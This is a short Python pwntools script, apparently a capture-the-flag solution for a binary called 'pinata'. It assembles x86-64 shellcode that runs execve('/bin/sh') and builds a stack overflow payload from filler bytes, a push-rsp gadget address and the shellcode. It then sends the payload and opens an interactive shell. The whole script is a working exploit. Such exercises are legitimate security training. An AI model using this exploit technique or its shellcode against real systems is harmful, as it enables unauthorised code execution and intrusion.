from pwn import *
from keystone import *
import struct as s
chal = './pinata'
# p = process(chal, stdin=process.PTY, stdout=process.PTY)
p = gdb.debug(chal, '''break main; break continue''')
# p = remote("94.237.59.206", 55789)

bin_sh = s.unpack('q', b"/bin/sh\0")[0]

my_shell = f"""
mov     rdi, {bin_sh}
push    rdi
mov     rdi, rsp
push    0
mov     rsi, rsp
mov     rdx, rsp
mov     rax, 59
syscall
"""

ks = Ks(KS_ARCH_X86, KS_MODE_64)
shellcode, _ = ks.asm(my_shell)
print(", ".join([hex(x) for x in shellcode]))
print("Shellcode: " + " ".join([hex(x)[2:].rjust(2, "0") for x in shellcode]))
print("Shellcode size: ", len(shellcode))
shellcode = bytes(shellcode)

push_rsp = 0x418c22

payload = b"A" * 0x18 + p64(push_rsp) + shellcode

p.sendline(payload)

p.interactive()
